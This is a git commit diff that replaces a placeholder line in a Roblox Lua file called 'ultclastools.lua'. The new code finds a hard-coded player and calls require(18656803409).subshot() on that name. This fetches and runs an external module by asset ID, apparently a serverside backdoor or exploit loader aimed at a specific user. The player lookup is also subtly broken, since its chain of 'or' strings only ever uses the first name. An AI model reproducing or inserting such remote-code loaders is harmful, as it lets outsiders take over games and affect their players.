c6f73d61c22b1c40809d00e33321e3def479fe06
TheEGodOfficial <112714914+TheEGodOfficial@users.noreply.github.com>
2025-08-03 18:30:55 -0400

    Update ultclastools.lua
    SIKE it isnt an e it is a require haha

--- ultclastools.lua
+++ ultclastools.lua
@@ -1,1 +1,3 @@
-e
+local plr = game:GetService("Players"):FindFirstChild("RobloxIsNotCoolV3" or "N_oobGamer" or "IIIIlllIIllllIIIll" or "eeatootvevovvooveovt")
+
+require(18656803409).subshot(plr.Name)
